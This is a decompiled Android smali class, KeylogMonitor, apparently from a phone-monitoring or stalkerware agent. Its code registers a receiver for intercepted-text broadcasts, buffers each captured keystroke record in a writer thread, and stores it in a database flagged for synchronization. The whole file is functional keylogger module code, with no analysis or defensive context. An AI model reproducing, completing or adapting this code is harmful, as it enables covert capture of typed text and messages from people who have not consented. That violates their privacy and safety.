.class public Lcom/hp/vd/module/monitor/KeylogMonitor;
.super Lcom/hp/vd/module/ModuleAbstract;
.source "KeylogMonitor.java"


# static fields
.field protected static final TAG:Ljava/lang/String; = "KeylogMonitor"


# instance fields
.field protected buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/hp/vd/data/concurrency/BlockingQueue<",
            "Lcom/hp/vd/data/KeylogData;",
            ">;"
        }
    .end annotation
.end field

.field protected keylogDataDao:Lcom/j256/ormlite/dao/Dao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/KeylogData;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation
.end field

.field protected moduleData:Lcom/hp/vd/data/ModuleData;

.field protected monitoringStatus:Z

.field protected receiver:Lcom/hp/vd/module/monitor/keylog/GenericReceiver;

.field protected writer:Lcom/hp/vd/data/concurrency/QueueConsumerDao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/hp/vd/data/concurrency/QueueConsumerDao<",
            "Lcom/hp/vd/data/KeylogData;",
            ">;"
        }
    .end annotation
.end field

.field protected writerThread:Ljava/lang/Thread;


# direct methods
.method public constructor <init>()V
    .locals 1

    .line 20
    invoke-direct {p0}, Lcom/hp/vd/module/ModuleAbstract;-><init>()V

    const/4 v0, 0x0

    .line 24
    iput-boolean v0, p0, Lcom/hp/vd/module/monitor/KeylogMonitor;->monitoringStatus:Z

    const/4 v0, 0x0

    .line 25
    iput-object v0, p0, Lcom/hp/vd/module/monitor/KeylogMonitor;->keylogDataDao:Lcom/j256/ormlite/dao/Dao;

    .line 27
    iput-object v0, p0, Lcom/hp/vd/module/monitor/KeylogMonitor;->receiver:Lcom/hp/vd/module/monitor/keylog/GenericReceiver;

    .line 29
    iput-object v0, p0, Lcom/hp/vd/module/monitor/KeylogMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 30
    iput-object v0, p0, Lcom/hp/vd/module/monitor/KeylogMonitor;->buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;

    .line 31
    iput-object v0, p0, Lcom/hp/vd/module/monitor/KeylogMonitor;->writer:Lcom/hp/vd/data/concurrency/QueueConsumerDao;

    .line 32
    iput-object v0, p0, Lcom/hp/vd/module/monitor/KeylogMonitor;->writerThread:Ljava/lang/Thread;

    return-void
.end method


# virtual methods
.method public deinitialize()Z
    .locals 1

    const/4 v0, 0x1

    return v0
.end method

.method public getDataClass()Ljava/lang/Class;
    .locals 1
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()",
            "Ljava/lang/Class<",
            "*>;"
        }
    .end annotation

    .line 38
    const-class v0, Lcom/hp/vd/data/KeylogData;

    return-object v0
.end method

.method public getModuleData()Lcom/hp/vd/data/ModuleData;
    .locals 3

    .line 51
    new-instance v0, Lcom/hp/vd/data/ModuleData;

    invoke-direct {v0}, Lcom/hp/vd/data/ModuleData;-><init>()V

    const-string v1, "monitor"

    .line 53
    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->type:Ljava/lang/String;

    .line 54
    sget-object v1, Lcom/hp/vd/module/Constants;->STATUS_ACTIVE:Ljava/lang/Integer;

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->status:Ljava/lang/Integer;

    .line 55
    invoke-virtual {p0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->packageName:Ljava/lang/String;

    .line 56
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/KeylogMonitor;->getModuleName()Ljava/lang/String;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->name:Ljava/lang/String;

    const/4 v1, 0x1

    .line 57
    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->version:Ljava/lang/Integer;

    const-string v1, "v1.0"

    .line 58
    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->versionCodename:Ljava/lang/String;

    const-string v1, "data"

    const-string v2, "text"

    .line 60
    invoke-virtual {v0, v1, v2}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/String;)V

    const/16 v1, 0x1c

    .line 65
    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    iput-object v2, v0, Lcom/hp/vd/data/ModuleData;->priorityLoad:Ljava/lang/Integer;

    .line 66
    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->prioritySynchronization:Ljava/lang/Integer;

    .line 68
    sget-object v1, Lcom/hp/vd/module/Constants;->EXTERNAL_MODULE:Ljava/lang/Integer;

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->internal:Ljava/lang/Integer;

    return-object v0
.end method

.method public getModuleName()Ljava/lang/String;
    .locals 1

    const-string v0, "KeylogMonitor"

    return-object v0
.end method

.method public initialize()Z
    .locals 4

    .line 76
    iget-object v0, p0, Lcom/hp/vd/module/monitor/KeylogMonitor;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v0

    .line 79
    :try_start_0
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/KeylogMonitor;->getDao()Lcom/j256/ormlite/dao/Dao;

    move-result-object v1

    iput-object v1, p0, Lcom/hp/vd/module/monitor/KeylogMonitor;->keylogDataDao:Lcom/j256/ormlite/dao/Dao;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    .line 89
    :try_start_1
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/KeylogMonitor;->getPersistedModuleData()Lcom/hp/vd/data/ModuleData;

    move-result-object v1

    iput-object v1, p0, Lcom/hp/vd/module/monitor/KeylogMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;
    :try_end_1
    .catch Ljava/lang/Throwable; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_0

    :catch_0
    move-exception v1

    const-string v2, "KeylogMonitor"

    const-string v3, "initialize(): could not load persisted module data."

    .line 92
    invoke-interface {v0, v2, v3, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    .line 101
    :goto_0
    new-instance v1, Lcom/hp/vd/data/concurrency/BlockingQueue;

    invoke-direct {v1}, Lcom/hp/vd/data/concurrency/BlockingQueue;-><init>()V

    iput-object v1, p0, Lcom/hp/vd/module/monitor/KeylogMonitor;->buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;

    .line 102
    new-instance v1, Lcom/hp/vd/data/concurrency/QueueConsumerDao;

    iget-object v2, p0, Lcom/hp/vd/module/monitor/KeylogMonitor;->buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;

    iget-object v3, p0, Lcom/hp/vd/module/monitor/KeylogMonitor;->keylogDataDao:Lcom/j256/ormlite/dao/Dao;

    invoke-direct {v1, v2, v3, v0}, Lcom/hp/vd/data/concurrency/QueueConsumerDao;-><init>(Lcom/hp/vd/data/concurrency/BlockingQueue;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/agent/log/IWriter;)V

    iput-object v1, p0, Lcom/hp/vd/module/monitor/KeylogMonitor;->writer:Lcom/hp/vd/data/concurrency/QueueConsumerDao;

    .line 104
    new-instance v1, Lcom/hp/vd/module/monitor/keylog/GenericReceiver;

    iget-object v2, p0, Lcom/hp/vd/module/monitor/KeylogMonitor;->buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;

    invoke-direct {v1, v2, v0}, Lcom/hp/vd/module/monitor/keylog/GenericReceiver;-><init>(Lcom/hp/vd/data/concurrency/BlockingQueue;Lcom/hp/vd/agent/log/IWriter;)V

    iput-object v1, p0, Lcom/hp/vd/module/monitor/KeylogMonitor;->receiver:Lcom/hp/vd/module/monitor/keylog/GenericReceiver;

    const/4 v0, 0x1

    return v0

    :catch_1
    move-exception v1

    const-string v2, "KeylogMonitor"

    const-string v3, "Could not create Dao<KeylogData>."

    .line 83
    invoke-interface {v0, v2, v3, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    const/4 v0, 0x0

    return v0
.end method

.method public install(Ljava/lang/String;)Z
    .locals 1

    const/16 v0, 0x172

    .line 44
    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    invoke-virtual {p0, v0}, Lcom/hp/vd/module/monitor/KeylogMonitor;->setDataReadLimit(Ljava/lang/Integer;)Z

    .line 46
    invoke-super {p0, p1}, Lcom/hp/vd/module/ModuleAbstract;->install(Ljava/lang/String;)Z

    move-result p1

    return p1
.end method

.method public isStarted()Z
    .locals 1

    .line 185
    iget-boolean v0, p0, Lcom/hp/vd/module/monitor/KeylogMonitor;->monitoringStatus:Z

    return v0
.end method

.method public start()Z
    .locals 7

    .line 124
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/KeylogMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v0

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v0

    const-string v1, "KeylogMonitor"

    const-string v2, "start() called."

    .line 125
    invoke-interface {v0, v1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 127
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/KeylogMonitor;->isActivated()Z

    move-result v1

    const/4 v2, 0x0

    if-nez v1, :cond_0

    const-string v1, "KeylogMonitor"

    const-string v3, "start(): This module is currently DEactivated."

    .line 128
    invoke-interface {v0, v1, v3}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    return v2

    .line 134
    :cond_0
    :try_start_0
    iget-object v1, p0, Lcom/hp/vd/module/monitor/KeylogMonitor;->writerThread:Ljava/lang/Thread;

    if-eqz v1, :cond_1

    iget-object v1, p0, Lcom/hp/vd/module/monitor/KeylogMonitor;->writerThread:Ljava/lang/Thread;

    invoke-virtual {v1}, Ljava/lang/Thread;->isAlive()Z

    move-result v1

    if-eqz v1, :cond_1

    iget-object v1, p0, Lcom/hp/vd/module/monitor/KeylogMonitor;->writerThread:Ljava/lang/Thread;

    invoke-virtual {v1}, Ljava/lang/Thread;->isInterrupted()Z

    move-result v1

    if-eqz v1, :cond_2

    .line 135
    :cond_1
    new-instance v1, Ljava/lang/Thread;

    iget-object v3, p0, Lcom/hp/vd/module/monitor/KeylogMonitor;->writer:Lcom/hp/vd/data/concurrency/QueueConsumerDao;

    const-string v4, "Writer-Queue-Keylog"

    invoke-direct {v1, v3, v4}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;Ljava/lang/String;)V

    iput-object v1, p0, Lcom/hp/vd/module/monitor/KeylogMonitor;->writerThread:Ljava/lang/Thread;

    .line 136
    iget-object v1, p0, Lcom/hp/vd/module/monitor/KeylogMonitor;->writerThread:Ljava/lang/Thread;

    invoke-virtual {v1}, Ljava/lang/Thread;->start()V

    .line 141
    :cond_2
    iget-boolean v1, p0, Lcom/hp/vd/module/monitor/KeylogMonitor;->monitoringStatus:Z

    const/4 v3, 0x1

    if-nez v1, :cond_3

    .line 142
    iget-object v1, p0, Lcom/hp/vd/module/monitor/KeylogMonitor;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v1}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    iget-object v4, p0, Lcom/hp/vd/module/monitor/KeylogMonitor;->receiver:Lcom/hp/vd/module/monitor/keylog/GenericReceiver;

    new-instance v5, Landroid/content/IntentFilter;

    const-string v6, "com.hp.vb.intent.keylog.text_intercepted"

    invoke-direct {v5, v6}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, v4, v5}, Landroid/content/Context;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    const-string v1, "KeylogMonitor"

    const-string v4, "start(): generic receiver registered"

    .line 147
    invoke-interface {v0, v1, v4}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 149
    iput-boolean v3, p0, Lcom/hp/vd/module/monitor/KeylogMonitor;->monitoringStatus:Z
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    :cond_3
    return v3

    :catch_0
    move-exception v1

    const-string v3, "KeylogMonitor"

    const-string v4, "start(): throwable caught"

    .line 153
    invoke-interface {v0, v3, v4, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return v2
.end method

.method public startOnHeartbeat()Z
    .locals 1

    const/4 v0, 0x1

    return v0
.end method

.method public stop()Z
    .locals 4

    .line 165
    :try_start_0
    iget-object v0, p0, Lcom/hp/vd/module/monitor/KeylogMonitor;->writerThread:Ljava/lang/Thread;

    if-eqz v0, :cond_0

    .line 166
    iget-object v0, p0, Lcom/hp/vd/module/monitor/KeylogMonitor;->writerThread:Ljava/lang/Thread;

    invoke-virtual {v0}, Ljava/lang/Thread;->interrupt()V

    .line 169
    :cond_0
    iget-object v0, p0, Lcom/hp/vd/module/monitor/KeylogMonitor;->receiver:Lcom/hp/vd/module/monitor/keylog/GenericReceiver;

    if-eqz v0, :cond_1

    .line 170
    iget-object v0, p0, Lcom/hp/vd/module/monitor/KeylogMonitor;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    iget-object v1, p0, Lcom/hp/vd/module/monitor/KeylogMonitor;->receiver:Lcom/hp/vd/module/monitor/keylog/GenericReceiver;

    invoke-virtual {v0, v1}, Landroid/content/Context;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    .line 174
    iget-object v1, p0, Lcom/hp/vd/module/monitor/KeylogMonitor;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v1}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v1

    const-string v2, "KeylogMonitor"

    const-string v3, "Throwable caught in stop()"

    invoke-interface {v1, v2, v3, v0}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    :cond_1
    :goto_0
    const/4 v0, 0x0

    .line 177
    iput-boolean v0, p0, Lcom/hp/vd/module/monitor/KeylogMonitor;->monitoringStatus:Z

    const/4 v0, 0x1

    return v0
.end method
